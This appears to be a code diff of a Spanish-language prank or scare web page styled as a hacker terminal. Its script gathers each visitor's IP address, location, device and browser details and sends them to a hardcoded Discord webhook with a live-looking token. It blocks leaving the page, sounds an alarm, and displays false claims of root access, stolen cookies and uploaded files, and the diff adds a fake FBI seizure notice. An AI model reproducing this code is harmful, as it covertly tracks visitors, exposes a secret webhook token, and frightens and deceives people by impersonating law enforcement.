@@ -16,23 +16,19 @@
             user-select: none;
             overflow-x: hidden;
         }
-
         #terminal {
             max-width: 950px;
             margin: 0 auto;
         }
-
         .input-line {
             display: flex;
             align-items: center;
         }
-
         .prompt {
             color: #ffffff;
             margin-right: 8px;
             white-space: nowrap;
         }
-
         input {
             background: transparent;
             border: none;
@@ -42,12 +38,10 @@
             width: 100%;
             outline: none;
         }
-
         .scan-line {
             color: #00ff00;
             margin: 2px 0;
         }
-
         .alert-header {
             color: #ff0000;
             font-weight: bold;
@@ -57,42 +51,54 @@
             border-bottom: 2px solid #ff0000;
             padding-bottom: 5px;
         }
-
         .info-table {
             margin-top: 10px;
             border-collapse: collapse;
             width: 100%;
         }
-
         .info-table td {
             padding: 5px 8px;
             border-bottom: 1px solid #1a1a1a;
         }
-
         .label {
             color: #888888;
             width: 240px;
         }
-
         .val {
             color: #ff3333;
             font-weight: bold;
             font-family: 'Courier New', monospace;
         }
-
         .blink-bg {
             animation: redBlink 0.8s infinite alternate;
         }
-
         @keyframes redBlink {
             0% { background-color: #050505; }
             100% { background-color: #2b0000; }
         }
-
         .exfiltration {
             color: #ffcc00;
             font-weight: bold;
             margin-top: 15px;
+        }
+        /* Estilo para el mensaje del FBI */
+        .fbi-warning {
+            background: #1a0000;
+            border: 3px solid #ff0000;
+            padding: 15px;
+            margin: 20px 0;
+            color: #ff9999;
+            font-weight: bold;
+            text-align: center;
+            font-size: 18px;
+            text-shadow: 0 0 10px #ff0000;
+            box-shadow: 0 0 30px rgba(255,0,0,0.3);
+        }
+        .fbi-warning span {
+            color: #ffffff;
+            background: #ff0000;
+            padding: 2px 8px;
+            border-radius: 4px;
         }
     </style>
 </head>
@@ -111,8 +117,7 @@
 </div>
 
 <script>
-    // ⚠️ PEGA AQUÍ LA URL DE TU WEBHOOK DE DISCORD ⚠️
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1546552141714428048/CwLRDva1L4_uX86NRC4V01_zor1gbvVtGJSzYm6IytMOKNW6uBCz6MtdTQ-aDmfQPoSy";
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1546576026434408450/AkPRlJx5D7FMfd5D9ZqoQFJeug7TU62JNrxyh6dImq7QUO966E2leruTYSnAcdTSg1Qu";
 
     const input = document.getElementById('cmdInput');
     const history = document.getElementById('history');
@@ -206,7 +211,7 @@
         return { ip: '192.168.1.105', isp: 'Red Doméstica Directa', location: 'Local Network', coords: 'N/A' };
     }
 
-    // Envío a Discord
+    // Envío a Discord con los datos reales (sin cambios)
     async function sendToDiscord(data) {
         if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("AQUI_PEGA_TU_WEBHOOK")) return;
 
@@ -240,7 +245,7 @@
         } catch (err) {}
     }
 
-    // Prevenir salida voluntaria sin susto
+    // Prevenir salida voluntaria (se mantiene)
     window.addEventListener('beforeunload', function (e) {
         e.preventDefault();
         e.returnValue = '';
@@ -260,6 +265,7 @@
             loading.innerText = '\n[!] ESTABLECIENDO CONEXIÓN DIRECTA Y EJECUTANDO PAYLOAD...';
             history.appendChild(loading);
 
+            // Recopilamos datos (igual que antes)
             const netData = await getIpData();
             const battery = await getBatteryInfo();
             const gpu = getGPU();
@@ -270,7 +276,6 @@
             const language = navigator.language || 'es-ES';
             const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-            // Recopilar datos
             const collectedData = {
                 command: commandText || 'System_Default_Execution',
                 ip: netData.ip,
@@ -285,18 +290,25 @@
                 userAgent: userAgent
             };
 
-            sendToDiscord(collectedData);
+            await sendToDiscord(collectedData);
 
             setTimeout(() => {
-                // Activar Alarma y Fondo Rojo Parpadeante
                 document.body.classList.add('blink-bg');
                 playAlarm();
 
-                loading.innerText = '[CRITICAL WARNING] ¡ACCESO REMOTO OTORGADO!SISTEMA COMPROMETIDO.\n';
+                loading.innerText = '[CRITICAL WARNING] ¡ACCESO REMOTO OTORGADO! SISTEMA COMPROMETIDO.\n';
 
                 const result = document.createElement('div');
                 result.innerHTML = `
-                    <div class="alert-header">[!] ALERTA DE SEGURIDAD: EXTRACCIÓN DE DATOS EN PROCESO [!]</div>
+                    <div class="alert-header">[!] ALERTA DE SEGURIDAD: INTERVENCIÓN DEL FBI [!]</div>
+                    <div class="fbi-warning">
+                        🛑 ESTA PÁGINA HA SIDO INTERVENIDA POR EL FBI POR ROBO DE INFORMACIÓN.<br>
+                        EL PROPIETARIO HA SIDO IDENTIFICADO Y SERÁ PROCESADO.<br>
+                        <span>NO INTRODUZCA MÁS DATOS. CIERRE ESTA PÁGINA INMEDIATAMENTE.</span>
+                    </div>
+                    <div style="color: #ff0000; font-weight: bold; text-align: center; margin: 10px 0;">
+                        ⚠️ LOS DATOS SIGUIENTES HAN SIDO CAPTURADOS Y ENVIADOS A LAS AUTORIDADES ⚠️
+                    </div>
                     <table class="info-table">
                         <tr><td class="label">ESTADO DE ACCESO:</td><td class="val">ROOT / ADMINISTRADOR (BYPASS SUCCESS)</td></tr>
                         <tr><td class="label">IP PÚBLICA OBJETIVO:</td><td class="val">${netData.ip}</td></tr>
@@ -312,7 +324,7 @@
 
                     <div class="exfiltration" id="progressText">
                         [>] Clonando credenciales local storage... OK<br>
-                        [>] Copiando cookies de sesión actives... OK<br>
+                        [>] Copiando cookies de sesión activas... OK<br>
                         [>] Enviando archivos locales de C:\\Users\\${userName}\\ a servidor externo: <span id="counter">0</span>%
                     </div>
                 `;
@@ -320,7 +332,7 @@
                 history.appendChild(result);
                 window.scrollTo(0, document.body.scrollHeight);
 
-                // Contador de porcentaje de carga
+                // Contador de porcentaje de carga (efecto visual)
                 let count = 0;
                 const counterElem = document.getElementById('counter');
                 const interval = setInterval(() => {
